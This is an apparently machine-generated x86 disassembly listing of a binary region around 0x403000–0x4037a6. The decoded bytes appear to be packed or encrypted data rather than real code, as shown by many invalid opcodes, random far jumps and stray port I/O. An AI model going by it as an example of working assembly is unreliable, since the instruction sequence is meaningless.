  403009:	inc    edi
  40300a:	xchg   esp,eax
  40300b:	adc    DWORD PTR [edx],0x4
  40300e:	jp     0x402fab
  403010:	xor    DWORD PTR [edx],ecx
  403012:	jmp    0x402fd0
  403014:	adc    BYTE PTR [esi-0x7f9d6ec9],cl
  40301a:	lea    ebp,[esp+ecx*1+0x6e8b84d7]
  403021:	(bad)  
  403022:	jmp    0x564d:0x9003099e
  403029:	outs   dx,BYTE PTR es:[esi]
  40302b:	pop    ss
  40302c:	add    DWORD PTR [ecx-0x5b5f1c9],esi
  403032:	sub    eax,0x69965ffc
  403037:	scas   eax,DWORD PTR es:[edi]
  403038:	lea    ebx,[edx-0x1f]
  40303b:	adc    edx,0xd7ed30ba
  403041:	int    0x59
  403043:	add    BYTE PTR [eax],al
  403045:	inc    ecx
  403046:	push   ds
  403047:	or     ch,BYTE PTR [ebx]
  403049:	add    BYTE PTR [edx*1+0x18d61c88],ah
  403050:	push   ds
  403051:	and    al,cl
  403053:	jge    0x403089
  403055:	sub    eax,ecx
  403057:	or     BYTE PTR [ebp+esi*1+0x2a],ah
  40305b:	push   ds
  40305c:	out    dx,al
  40305d:	cmp    al,0x6c
  40305f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403060:	daa    
  403061:	lods   eax,DWORD PTR ds:[esi]
  403062:	into   
  403063:	xchg   esi,eax
  403064:	ins    DWORD PTR es:[edi],dx
  403065:	(bad)  
  403066:	ins    DWORD PTR es:[edi],dx
  403067:	jg     0x4030a5
  403069:	push   edx
  40306a:	cmc    
  40306b:	lea    eax,[esi]
  40306d:	pushf  
  40306e:	jmp    0xdefc:0x315e5f5a
  403075:	xchg   ecx,eax
  403076:	pop    edx
  403077:	(bad)  
  403079:	add    DWORD PTR [eax],0xea3fa276
  40307f:	and    di,WORD PTR [edi+ebx*8-0x39]
  403084:	test   DWORD PTR [ebp-0x58e64712],esp
  40308a:	cmp    DWORD PTR [esi],ecx
  40308c:	xchg   edi,eax
  40308d:	icebp  
  40308e:	cmp    BYTE PTR ds:[ebp+0x30],0x8a
  403093:	shl    BYTE PTR fs:[ebx+0x6c],cl
  403097:	and    dl,dl
  403099:	popf   
  40309a:	out    0xc,al
  40309c:	fcom   st(6)
  40309e:	mov    edx,0x492bb7d5
  4030a3:	sti    
  4030a4:	in     al,dx
  4030a5:	stos   DWORD PTR es:[edi],eax
  4030a6:	adc    ebp,edi
  4030a8:	pop    eax
  4030a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030aa:	and    eax,0x3b791e5b
  4030af:	mov    dl,0x87
  4030b1:	inc    edx
  4030b2:	add    ebx,DWORD PTR [ecx-0x28]
  4030b5:	pop    ds
  4030b6:	call   0x74cb:0xf3c31a7a
  4030bd:	adc    DWORD PTR [ecx],esi
  4030bf:	mov    al,ds:0xf7a84b5
  4030c4:	pop    eax
  4030c5:	fldenv [ebx-0x3]
  4030c8:	push   es
  4030c9:	inc    esp
  4030ca:	out    dx,eax
  4030cb:	in     al,dx
  4030cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030cd:	(bad)  
  4030ce:	push   esi
  4030cf:	inc    esi
  4030d0:	and    eax,0x9d0a8b73
  4030d5:	push   0xffffff94
  4030d7:	xchg   edi,eax
  4030d8:	push   esi
  4030d9:	bnd jp 0x4030e2
  4030dc:	mov    WORD PTR [edi+0x1b],cs
  4030df:	sub    ebp,ebx
  4030e1:	xchg   BYTE PTR [ecx],ah
  4030e3:	cmp    al,0xc6
  4030e5:	pop    esp
  4030e6:	xchg   esi,eax
  4030e7:	lock mov ah,0xab
  4030ea:	das    
  4030eb:	mov    al,0x52
  4030ed:	xchg   edi,eax
  4030ee:	xchg   edx,eax
  4030ef:	mov    esi,0xd46bad25
  4030f4:	dec    ebx
  4030f5:	mov    DWORD PTR [ebx],eax
  4030f7:	mov    eax,ds:0xa7bf7703
  4030fc:	rcr    edi,cl
  4030fe:	mov    al,0x63
  403100:	cmp    DWORD PTR [esi+0x3754707d],ebp
  403106:	ds loopne 0x4030ff
  403109:	xor    DWORD PTR [edi-0x25],esi
  40310c:	ret    0x29d4
  40310f:	les    esi,FWORD PTR [esi-0x3c]
  403112:	mov    edx,0xe4b0bb39
  403117:	das    
  403118:	pushf  
  403119:	inc    ebx
  40311a:	out    dx,al
  40311b:	out    dx,al
  40311c:	mov    DWORD PTR ds:0xb38fdc82,ebp
  403122:	in     eax,0x25
  403124:	fcmovnu st,st(7)
  403126:	in     al,dx
  403127:	inc    edi
  403128:	or     ebx,DWORD PTR [esi]
  40312a:	xor    edi,DWORD PTR [eax-0x28]
  40312d:	(bad)  
  40312e:	mov    edx,0xe88fd9dc
  403133:	or     BYTE PTR [ebp+0x34296a6d],dl
  403139:	lock xor edx,DWORD PTR [eax-0x17]
  40313d:	cmp    al,0x74
  40313f:	jge    0x403140
  403141:	xor    BYTE PTR [ecx+0x19],dl
  403144:	cdq    
  403145:	cmc    
  403146:	push   ds
  403147:	pop    edi
  403148:	pop    edx
  403149:	daa    
  40314a:	jns    0x403179
  40314c:	jp     0x4030ed
  40314e:	ret    0x858f
  403151:	sub    eax,0x3582bd54
  403156:	les    ebx,FWORD PTR [ebx]
  403158:	lahf   
  403159:	pop    esp
  40315a:	cld    
  40315b:	jb     0x4031a3
  40315d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40315f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403160:	int3   
  403161:	scas   eax,DWORD PTR es:[edi]
  403162:	xchg   esp,eax
  403163:	je     0x40316a
  403165:	xor    BYTE PTR [esi+edx*4],ah
  403168:	add    DWORD PTR [edi],ebx
  40316a:	pop    ebx
  40316b:	add    BYTE PTR [edi+0x7f],ah
  40316e:	mov    ecx,0xd9db1a93
  403173:	xchg   BYTE PTR [ebp+0x1b],dh
  403176:	adc    bl,BYTE PTR [edx+0x50e3eefd]
  40317c:	push   cs
  40317d:	jmp    0x40318c
  40317f:	add    cl,BYTE PTR [edx+ebx*1]
  403182:	mov    ah,0xcd
  403184:	aas    
  403185:	(bad)  
  403186:	fcom   st(3)
  403188:	enter  0xefc9,0x76
  40318c:	lods   eax,DWORD PTR ds:[esi]
  40318d:	ficom  WORD PTR [eax+0x6cb766ed]
  403193:	dec    edx
  403194:	xchg   edx,eax
  403195:	pop    edx
  403196:	jp     0x403191
  403198:	xchg   ebx,eax
  403199:	adc    esp,DWORD PTR [ebx]
  40319b:	dec    edi
  40319c:	mov    esp,DWORD PTR [edx]
  40319e:	enter  0xb8d3,0xa6
  4031a2:	adc    ah,BYTE PTR [ecx+0x4f7142]
  4031a8:	pop    ss
  4031a9:	pop    edx
  4031aa:	cmp    al,0xb0
  4031ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031ad:	sbb    BYTE PTR [eax+0x57f083ac],ah
  4031b3:	fcomi  st,st(7)
  4031b5:	push   cs
  4031b6:	jne    0x40321a
  4031b8:	and    eax,esi
  4031ba:	cmp    edi,eax
  4031bc:	arpl   bx,bp
  4031be:	shl    BYTE PTR [ecx],1
  4031c0:	push   ss
  4031c1:	mov    ds:0x4975fc0a,eax
  4031c6:	outs   dx,DWORD PTR ds:[esi]
  4031c7:	sub    esi,DWORD PTR [eax+0x23]
  4031ca:	fild   WORD PTR [edx-0x5bf69eeb]
  4031d0:	dec    DWORD PTR [ebx-0x5574a929]
  4031d6:	sti    
  4031d7:	add    al,0xfc
  4031d9:	stc    
  4031da:	xchg   esp,eax
  4031db:	je     0x4031c5
  4031dd:	jnp    0x4031d4
  4031df:	jecxz  0x403199
  4031e1:	mov    ecx,0x5ed9f134
  4031e6:	or     DWORD PTR [ecx+0x63],0x65
  4031ea:	cmp    DWORD PTR [edi+0x6a],ebp
  4031ed:	(bad)  
  4031ee:	jle    0x403186
  4031f0:	mov    cl,0xcb
  4031f2:	push   ecx
  4031f3:	dec    ebp
  4031f4:	inc    edx
  4031f5:	in     eax,0x22
  4031f7:	jmp    0x90aa:0x8320f582
  4031fe:	shl    BYTE PTR [edi+ebx*4],0x35
  403202:	jecxz  0x403232
  403204:	clc    
  403205:	shl    BYTE PTR [edx],1
  403207:	test   eax,0x88c04216
  40320c:	test   BYTE PTR [edx+0x23],bl
  40320f:	xchg   edx,eax
  403210:	ja     0x4031c3
  403212:	mov    BYTE PTR [edi-0x5124a53e],cl
  403218:	inc    esp
  403219:	xchg   esi,eax
  40321a:	imul   ebp,DWORD PTR [esi],0x353bcc94
  403220:	xchg   edi,eax
  403221:	fcomp  QWORD PTR [ebx]
  403223:	adc    bh,dl
  403225:	and    al,0x4d
  403227:	lea    eax,[ebp-0x436e672a]
  40322d:	ficom  DWORD PTR [esi+0x1e]
  403231:	or     dl,ch
  403233:	into   
  403234:	cwde   
  403235:	imul   esp,DWORD PTR [ecx+0x1244c9f7],0x26593429
  40323f:	pop    edx
  403240:	pop    ebx
  403241:	jno    0x40325f
  403243:	add    bh,BYTE PTR [edi-0x6]
  403246:	fmul   st(1),st
  403248:	gs jp  0x403279
  40324b:	push   ds
  40324c:	mov    BYTE PTR [ebp+0x4b],dl
  40324f:	fisub  DWORD PTR [ebp+0xb]
  403252:	add    ebp,ebp
  403254:	push   edx
  403255:	sub    DWORD PTR [ecx+0x350bc7a3],ebx
  40325b:	ins    BYTE PTR es:[edi],dx
  40325c:	gs loopne 0x403223
  40325f:	sub    BYTE PTR [eax],bl
  403261:	adc    BYTE PTR [esi],bh
  403263:	int    0x5a
  403265:	nop
  403266:	sbb    BYTE PTR [edx+0x34],ah
  403269:	pusha  
  40326a:	sbb    DWORD PTR [ecx+0x1f],esi
  40326d:	pop    esi
  40326e:	cmp    ah,al
  403270:	or     bl,bh
  403272:	mov    cl,0xa2
  403274:	or     ebx,DWORD PTR [ebx-0x13]
  403277:	sub    al,0x8e
  403279:	mov    bh,0x3d
  40327b:	sbb    ch,BYTE PTR [edi]
  40327d:	pushf  
  40327e:	jp     0x40329b
  403280:	inc    ebx
  403281:	cmp    ebp,edi
  403283:	scas   al,BYTE PTR es:[edi]
  403284:	popa   
  403285:	repnz sub al,0x9e
  403288:	(bad)  
  403289:	and    DWORD PTR [edx],eax
  40328b:	cmp    edx,DWORD PTR [esp+ebx*2-0x16]
  40328f:	retf   0xa3b5
  403292:	mov    WORD PTR [edx+ebx*2-0x78],es
  403296:	loop   0x4032ae
  403298:	xor    eax,0x47a58873
  40329d:	inc    ebp
  40329e:	stc    
  40329f:	or     BYTE PTR [eax+ebp*2-0x2a],ah
  4032a3:	and    ecx,DWORD PTR [eax-0x729a1602]
  4032a9:	repz pop ebp
  4032ab:	iret   
  4032ac:	add    dh,BYTE PTR [edi]
  4032ae:	cli    
  4032af:	enter  0x3639,0x63
  4032b3:	out    0xb1,al
  4032b5:	sahf   
  4032b6:	inc    edx
  4032b7:	mov    ah,0x4
  4032b9:	sub    ah,BYTE PTR ds:0x3e0db7e4
  4032bf:	in     al,dx
  4032c0:	cs call 0x3af6642b
  4032c6:	fisttp DWORD PTR [edi+0x66ba8a4f]
  4032cc:	adc    DWORD PTR [ecx],edx
  4032ce:	ret    
  4032cf:	adc    edx,DWORD PTR [ebx-0x53]
  4032d2:	xor    BYTE PTR [edx+0x6b],ch
  4032d5:	push   ebx
  4032d6:	push   cs
  4032d7:	ins    BYTE PTR es:[edi],dx
  4032d8:	add    al,0x56
  4032da:	fiadd  DWORD PTR [edx+ecx*8+0x67bff66f]
  4032e1:	xchg   esi,eax
  4032e2:	adc    dh,BYTE PTR [edx+esi*4+0x25]
  4032e6:	repz cmp eax,edx
  4032e9:	add    BYTE PTR [ebx+0x6882de90],bh
  4032ef:	sub    al,0x4b
  4032f1:	sahf   
  4032f2:	pusha  
  4032f3:	popf   
  4032f4:	sahf   
  4032f5:	js     0x403277
  4032f7:	out    dx,eax
  4032f8:	imul   esp,DWORD PTR [eax+edx*8+0x55eb144d],0x8c74ba86
  403303:	bndstx ds:0xc7feb0f9,(bad)
  40330a:	push   0x46
  40330c:	jp     0x403308
  40330e:	scas   eax,DWORD PTR es:[edi]
  40330f:	dec    ebx
  403310:	ret    
  403311:	sbb    esp,DWORD PTR [esi-0x1d]
  403314:	adc    eax,0x4990242b
  403319:	pop    esp
  40331a:	mov    ds:0x50bc2384,al
  40331f:	pop    edx
  403320:	pop    ss
  403321:	xchg   edx,eax
  403322:	ret    0x4bc8
  403325:	imul   BYTE PTR [eax]
  403327:	dec    esp
  403328:	xchg   esi,eax
  403329:	out    0x4f,al
  40332b:	adc    edi,ecx
  40332d:	ja     0x4032ec
  40332f:	(bad)  
  403330:	clc    
  403331:	sub    cl,BYTE PTR [ebx-0x166c8e43]
  403337:	inc    ecx
  403338:	leave  
  403339:	in     eax,dx
  40333a:	cld    
  40333b:	pop    edx
  40333c:	push   ecx
  40333d:	mov    dh,ch
  40333f:	push   edi
  403340:	mov    ah,0xf0
  403342:	(bad)
  403345:	out    dx,eax
  403346:	call   0x7c32ffda
  40334b:	adc    DWORD PTR [ebx-0x4ceba623],eax
  403351:	pop    ebx
  403352:	jb     0x403385
  403354:	dec    ecx
  403355:	test   al,0x67
  403357:	xor    cl,al
  403359:	inc    esp
  40335a:	in     eax,dx
  40335b:	outs   dx,BYTE PTR ds:[esi]
  40335c:	nop
  40335d:	mov    ebp,0x8230bba2
  403362:	xchg   ecx,eax
  403363:	in     al,0x10
  403365:	outs   dx,DWORD PTR ds:[esi]
  403366:	ds es push ds
  403369:	stos   DWORD PTR es:[edi],eax
  40336a:	jmp    0x7d37:0x59260032
  403371:	jp     0x4033bc
  403373:	js     0x4033b2
  403375:	cwde   
  403376:	imul   BYTE PTR [edx+0x15]
  403379:	xor    al,0x7f
  40337b:	lahf   
  40337c:	sbb    edx,esi
  40337e:	in     eax,dx
  40337f:	popf   
  403380:	mov    dl,bl
  403382:	(bad)  
  403383:	loopne 0x403369
  403385:	enter  0xa38b,0xe9
  403389:	pop    edi
  40338a:	sbb    cl,ah
  40338c:	cmp    eax,0xa3e55dc1
  403391:	in     eax,0x3f
  403393:	mov    esi,0x617cdd54
  403398:	cmp    ecx,DWORD PTR [edi-0xadc06d9]
  40339e:	or     al,0xdd
  4033a0:	int3   
  4033a1:	stos   BYTE PTR es:[edi],al
  4033a2:	enter  0xc44d,0xfe
  4033a6:	mov    ebp,0x27a86af0
  4033ab:	xor    edx,ecx
  4033ad:	addr16 xor eax,0x27579b78
  4033b3:	cmp    BYTE PTR [esi],bh
  4033b5:	lea    ebp,[esi-0xee8af4c]
  4033bb:	imul   esp,DWORD PTR [eax+0x44660403],0x5
  4033c2:	nop
  4033c3:	jp     0x40334e
  4033c5:	lods   al,BYTE PTR ds:[esi]
  4033c6:	sbb    bl,BYTE PTR [ebp+eiz*4+0x4528d83b]
  4033cd:	sbb    al,0x5d
  4033cf:	sahf   
  4033d0:	call   0x448f:0xbe0d5f05
  4033d7:	jae    0x403391
  4033d9:	add    DWORD PTR [esi-0x7062159b],ebx
  4033df:	dec    edi
  4033e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033e1:	dec    eax
  4033e2:	je     0x40340b
  4033e4:	loopne 0x4033c9
  4033e6:	mov    eax,ds:0x127a41da
  4033eb:	jle    0x4033c8
  4033ed:	inc    ecx
  4033ee:	cmp    eax,0xb4411ab6
  4033f3:	and    al,0xc5
  4033f5:	lods   eax,DWORD PTR ds:[esi]
  4033f6:	jmp    0x403441
  4033f8:	jge    0x40346b
  4033fa:	dec    ebx
  4033fb:	inc    edx
  4033fc:	xchg   edi,eax
  4033fd:	das    
  4033fe:	fisubr DWORD PTR [ebp+0x47]
  403401:	xor    al,0x33
  403403:	enter  0xc772,0x31
  403407:	adc    BYTE PTR [edi],ch
  403409:	xor    al,0xf7
  40340b:	ror    DWORD PTR [esi+0xd],cl
  40340e:	cmp    al,0x51
  403410:	mov    cl,0x82
  403412:	call   0x336166be
  403417:	out    0xc1,al
  403419:	sahf   
  40341a:	mov    cl,0xf3
  40341c:	aam    0x1d
  40341e:	repnz xor BYTE PTR [ebx],bl
  403421:	cmc    
  403422:	jg     0x40347c
  403424:	inc    eax
  403425:	and    bl,bl
  403427:	in     eax,dx
  403428:	xchg   ecx,eax
  403429:	mov    dl,BYTE PTR [edx+ecx*4]
  40342c:	pop    es
  40342d:	stc    
  40342e:	cmp    eax,0xf9c4deb
  403433:	dec    ecx
  403434:	mov    esi,0x1ec28160
  403439:	push   ss
  40343a:	in     eax,dx
  40343b:	outs   dx,BYTE PTR ds:[esi]
  40343c:	(bad)  
  40343d:	jmp    0xf3430f2f
  403442:	sub    BYTE PTR [ebx],ah
  403444:	cmp    eax,DWORD PTR [eax]
  403446:	or     edi,DWORD PTR [edx-0x3c1739b7]
  40344c:	enter  0x9892,0x5f
  403450:	add    ecx,DWORD PTR [esi]
  403452:	das    
  403453:	and    eax,0x86e19db4
  403458:	mov    ecx,0xd06cb752
  40345d:	xchg   ebp,eax
  40345e:	clc    
  40345f:	clc    
  403460:	push   es
  403461:	scas   eax,DWORD PTR es:[edi]
  403462:	sub    eax,0xf9b2fc1f
  403467:	xchg   ebp,eax
  403468:	xchg   esi,eax
  403469:	clc    
  40346a:	arpl   WORD PTR ds:[edx+esi*4-0x72],ax
  40346f:	cdq    
  403470:	xchg   ecx,eax
  403471:	(bad)  
  403472:	jo     0x40341a
  403474:	scas   al,BYTE PTR es:[edi]
  403475:	push   edi
  403476:	icebp  
  403477:	icebp  
  403478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403479:	add    ch,BYTE PTR [edx+0x360e1a25]
  40347f:	jmp    0xa4e5:0x27dc4df0
  403486:	mov    DWORD PTR [eax+0x7451121d],edi
  40348c:	int    0xac
  40348e:	int3   
  40348f:	mov    al,ds:0x4acdc8a7
  403494:	les    edx,FWORD PTR [ecx-0xc]
  403497:	es arpl dx,bx
  40349a:	add    edx,DWORD PTR [eax-0x70]
  40349d:	push   eax
  40349e:	aad    0x5c
  4034a0:	sahf   
  4034a1:	sbb    al,0x65
  4034a3:	cld    
  4034a4:	and    BYTE PTR [ecx-0xb],dl
  4034a7:	rol    DWORD PTR [ebx-0x10],cl
  4034aa:	xchg   edx,eax
  4034ab:	xchg   edi,eax
  4034ac:	pop    ds
  4034ad:	ja     0x403458
  4034af:	sahf   
  4034b0:	adc    BYTE PTR ds:[edx],dl
  4034b3:	sti    
  4034b4:	cmp    bh,BYTE PTR [ebp-0x7f]
  4034b7:	mov    ds,edx
  4034b9:	inc    ebx
  4034ba:	aad    0x83
  4034bc:	scas   eax,DWORD PTR es:[edi]
  4034bd:	xor    eax,0x885381e9
  4034c2:	mov    dh,0x6d
  4034c4:	adc    al,0x35
  4034c6:	adc    eax,0x2faefa7b
  4034cb:	xor    ebp,0x3f
  4034ce:	jb     0x40352a
  4034d0:	sbb    eax,0x76da343d
  4034d5:	bound  esp,QWORD PTR [bp+si-0x3f]
  4034d9:	jb     0x40351f
  4034db:	pop    ds
  4034dc:	push   cs
  4034dd:	into   
  4034de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034df:	cmp    BYTE PTR [eax-0x38],al
  4034e2:	add    DWORD PTR [esi],0x2
  4034e5:	je     0x403535
  4034e7:	pop    ebp
  4034e8:	call   0xf796d577
  4034ed:	inc    edi
  4034ee:	js     0x403471
  4034f0:	rcl    DWORD PTR [edx-0x52],1
  4034f3:	pop    es
  4034f4:	sub    DWORD PTR [esp+edx*4+0x457e5689],edi
  4034fb:	sbb    WORD PTR [ecx+0x484517c2],di
  403502:	mov    WORD PTR [esi-0xb],gs
  403505:	xchg   edx,eax
  403506:	and    cl,BYTE PTR [eax-0x5c]
  403509:	retf   
  40350a:	jo     0x40355e
  40350c:	dec    esi
  40350d:	mov    edx,0xc1d6a03e
  403512:	adc    al,0x84
  403514:	or     ah,BYTE PTR [edi+0x678d0f22]
  40351a:	add    al,0xaa
  40351c:	add    eax,0xf08e3a47
  403521:	jecxz  0x4034d3
  403523:	enter  0x7115,0x60
  403527:	and    esp,ebp
  403529:	add    ch,ah
  40352b:	mov    esi,0xea119000
  403530:	jl     0x4034f7
  403532:	sub    dl,BYTE PTR [edx-0x636f0845]
  403538:	scas   eax,DWORD PTR es:[edi]
  403539:	ins    BYTE PTR es:[edi],dx
  40353a:	icebp  
  40353b:	adc    ch,BYTE PTR [eax+0x20ba39ca]
  403541:	mov    ah,0x80
  403543:	mov    bh,0x62
  403545:	call   DWORD PTR [esi+0x1db01409]
  40354b:	ror    WORD PTR [ecx],0x77
  40354f:	dec    edx
  403550:	shl    ebp,0x37
  403553:	fiadd  WORD PTR [edx]
  403555:	cmp    BYTE PTR [ebp+eax*8-0x43],cl
  403559:	clc    
  40355a:	jno    0x40353e
  40355c:	xor    esp,DWORD PTR cs:[esi-0x36]
  403560:	dec    edx
  403561:	(bad)  [edx-0x1649534d]
  403567:	cdq    
  403568:	(bad)  
  403569:	mov    edi,0xf5101ff
  40356e:	test   DWORD PTR [edi+0x7617a3d8],esp
  403574:	inc    esi
  403575:	int    0xb3
  403577:	push   cs
  403578:	xor    eax,0x6663cb83
  40357d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40357e:	mov    cs,WORD PTR [ebp+0x251bcd67]
  403584:	sub    BYTE PTR [ebx+eax*8],dl
  403587:	pop    ebp
  403588:	bound  esi,QWORD PTR [ebx]
  40358a:	jno    0x4035a9
  40358c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40358d:	cmp    DWORD PTR [edx-0x57480b37],edi
  403593:	fst    st(2)
  403595:	sbb    ebp,DWORD PTR [ebp-0x69]
  403598:	test   al,0xa2
  40359a:	inc    eax
  40359b:	xlat   BYTE PTR ds:[ebx]
  40359c:	ins    DWORD PTR es:[edi],dx
  40359d:	push   edx
  40359e:	add    ah,BYTE PTR [ebp-0x52ed7a46]
  4035a4:	push   ds
  4035a5:	lods   al,BYTE PTR ds:[esi]
  4035a6:	cmp    DWORD PTR ds:0x3d4b7115,ebx
  4035ac:	jne    0x403574
  4035ae:	cmc    
  4035af:	shr    DWORD PTR ds:0xb7709f95,0x42
  4035b6:	cwde   
  4035b7:	pop    ebx
  4035b8:	in     eax,dx
  4035b9:	sub    ah,BYTE PTR [esi-0x5cabfa54]
  4035bf:	push   es
  4035c0:	push   edx
  4035c1:	and    eax,0x5c3784f6
  4035c6:	jle    0x403612
  4035c8:	xor    eax,0x14943035
  4035cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ce:	mov    ebx,0x45c660f
  4035d3:	dec    ecx
  4035d4:	dec    ebp
  4035d5:	out    0xbc,al
  4035d7:	xchg   BYTE PTR [ecx+0x1f],al
  4035da:	push   edx
  4035db:	lods   eax,DWORD PTR ds:[esi]
  4035dc:	sar    DWORD PTR ds:0x72bdffa4,cl
  4035e2:	jbe    0x40358e
  4035e4:	stos   BYTE PTR es:[edi],al
  4035e5:	xchg   esi,eax
  4035e6:	gs js  0x4035e1
  4035e9:	adc    bl,BYTE PTR [edx+edi*2+0x6b]
  4035ed:	test   al,0xa8
  4035ef:	pushf  
  4035f0:	adc    al,0x58
  4035f2:	add    eax,0x45b9552d
  4035f7:	fs into 
  4035f9:	fwait
  4035fa:	inc    ebx
  4035fb:	(bad)  
  4035fc:	adc    DWORD PTR [edx+edi*1-0x3],ecx
  403600:	lods   eax,DWORD PTR ds:[esi]
  403601:	shr    BYTE PTR [eax+0x8],1
  403604:	ds stos BYTE PTR es:[edi],al
  403606:	cli    
  403607:	pop    esp
  403608:	push   esp
  403609:	ret    
  40360a:	push   cs
  40360b:	sub    ch,bl
  40360d:	(bad)  
  40360f:	adc    dh,BYTE PTR [edx]
  403611:	push   esp
  403612:	and    edx,DWORD PTR [esi+0x3f]
  403615:	fidiv  WORD PTR ds:0x48a5bc68
  40361b:	sahf   
  40361c:	push   cs
  40361d:	mov    ah,0x4f
  40361f:	cs sub dl,cl
  403622:	adc    al,0x57
  403624:	xchg   BYTE PTR [ebx-0x209d950a],ah
  40362a:	(bad)  
  40362b:	in     al,dx
  40362c:	retf   
  40362d:	(bad)  
  40362e:	jo     0x403685
  403630:	dec    edx
  403631:	and    esp,ecx
  403633:	xchg   ebp,eax
  403634:	sbb    eax,0xc81dc3bb
  403639:	push   edi
  40363a:	push   esi
  40363b:	fst    DWORD PTR ds:0x95b16262
  403641:	xchg   ecx,eax
  403642:	mov    esi,0x144b4692
  403647:	mov    bl,0x10
  403649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40364a:	push   eax
  40364b:	xor    DWORD PTR [ecx],eax
  40364d:	repnz pop es
  40364f:	stos   BYTE PTR es:[edi],al
  403650:	mov    ecx,0xc4a2921
  403655:	or     BYTE PTR [eax],0x80
  403658:	imul   esi,DWORD PTR [ebx-0x4a],0xabd29e39
  40365f:	pop    es
  403660:	ret    0x678b
  403663:	mov    eax,0x19d75862
  403668:	push   eax
  403669:	mov    WORD PTR [eax+ebp*2-0x36],cs
  40366d:	mov    dl,0x77
  40366f:	mul    ebx
  403671:	aaa    
  403672:	fdiv   st,st(5)
  403674:	mov    al,0x1e
  403676:	clc    
  403677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403678:	rcl    DWORD PTR [edi],1
  40367a:	into   
  40367b:	ins    BYTE PTR es:[edi],dx
  40367c:	in     eax,0x54
  40367e:	mov    WORD PTR [eax-0x2d6fe64d],?
  403684:	adc    bl,ch
  403686:	mov    al,ds:0x32acf53b
  40368b:	push   cs
  40368c:	shl    cl,0xbd
  40368f:	mov    eax,0x82bc367a
  403694:	ja     0x403631
  403696:	sbb    eax,0x21910570
  40369b:	test   al,0xa
  40369d:	bound  eax,QWORD PTR [ebx-0x5]
  4036a0:	fmul   st,st(6)
  4036a2:	inc    edi
  4036a3:	push   esi
  4036a4:	(bad)  
  4036a5:	mov    eax,0x395ced85
  4036aa:	xchg   BYTE PTR [edi+ebp*2+0x3f],dh
  4036ae:	inc    eax
  4036af:	les    esp,FWORD PTR [edx]
  4036b1:	aam    0x47
  4036b3:	push   esp
  4036b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036b5:	jmp    0xd132c0c0
  4036ba:	ffreep st(7)
  4036bc:	stos   BYTE PTR es:[edi],al
  4036bd:	jo     0x4036ed
  4036bf:	mov    ah,0x99
  4036c1:	ficomp WORD PTR [ebx-0x15d27a44]
  4036c7:	pop    ds
  4036c8:	rcr    BYTE PTR [ebx+ecx*2],1
  4036cb:	push   esi
  4036cc:	dec    edx
  4036cd:	or     eax,0xc032883a
  4036d2:	neg    edi
  4036d4:	sub    cl,BYTE PTR [ebp+ebp*2+0x1]
  4036d8:	mov    ecx,0x9a909b15
  4036dd:	xor    eax,0xede7ba2c
  4036e3:	(bad)  
  4036e4:	cld    
  4036e5:	cdq    
  4036e6:	(bad)  
  4036e8:	int    0x34
  4036ea:	into   
  4036eb:	stc    
  4036ec:	sbb    eax,DWORD PTR [ecx-0x6693a640]
  4036f2:	inc    edx
  4036f3:	jmp    0x363d:0x36dec7d3
  4036fa:	cmp    ebx,ebp
  4036fc:	inc    esi
  4036fd:	repnz mov ah,0xac
  403700:	xchg   esp,eax
  403701:	inc    esp
  403702:	xor    al,0xcb
  403704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403705:	mov    ebx,DWORD PTR [ebx+edi*4-0x2]
  403709:	push   edx
  40370a:	daa    
  40370b:	nop
  40370c:	(bad)  
  40370d:	sbb    eax,0x48becb26
  403712:	jge    0x4036ca
  403714:	sti    
  403715:	frstor [ebx]
  403717:	sub    eax,0xb821d987
  40371c:	arpl   WORD PTR [esi-0x2626203e],bp
  403722:	or     cl,BYTE PTR [esi]
  403724:	je     0x40371f
  403726:	or     bh,BYTE PTR ds:0x4fef6baf
  40372c:	sbb    DWORD PTR [ebp+0x379664b0],ebp
  403732:	pop    edx
  403733:	xor    ebx,DWORD PTR [edx]
  403735:	int    0x50
  403737:	inc    esi
  403738:	mov    edx,0xdeb17038
  40373d:	mov    ecx,0x436eadbb
  403742:	jbe    0x4036e5
  403744:	leave  
  403745:	dec    edi
  403746:	mov    eax,ds:0x9e6d3da2
  40374b:	pop    ebp
  40374c:	mov    cl,0xf4
  40374e:	and    bh,dh
  403750:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403752:	gs jb  0x4036de
  403755:	inc    ecx
  403756:	cdq    
  403757:	dec    ebp
  403758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403759:	sub    DWORD PTR [edi+0x4df004fc],0x7c
  403760:	mov    ch,BYTE PTR [ebx+0x65394537]
  403766:	sub    DWORD PTR [esi-0x39],edi
  403769:	xor    cl,ah
  40376b:	fs pop esi
  40376d:	out    0xdc,eax
  40376f:	mov    WORD PTR [edi-0x4e],ss
  403772:	xor    DWORD PTR [eax],esi
  403774:	arpl   WORD PTR [ebx-0x63],bp
  403777:	xchg   ecx,eax
  403778:	xchg   esp,eax
  403779:	mov    ds:0x3cc7d6bb,eax
  40377e:	add    DWORD PTR [esi-0x7e0b6724],esi
  403784:	(bad)  
  403785:	push   ds
  403786:	aas    
  403787:	lds    ecx,FWORD PTR [ecx+0x21078631]
  40378d:	shl    DWORD PTR [esi+0x43],0xad
  403791:	rol    cl,0x41
  403794:	inc    ecx
  403795:	dec    eax
  403796:	aaa    
  403797:	adc    al,0xf5
  403799:	xor    al,0x39
  40379b:	gs scas al,BYTE PTR es:[edi]
  40379d:	jl     0x403729
  40379f:	jae    0x403771
  4037a1:	pop    eax
  4037a2:	cmp    al,0x6d
  4037a4:	popf   
  4037a5:	dec    ebx
  4037a6:	mov    ecx,0x90f875b4
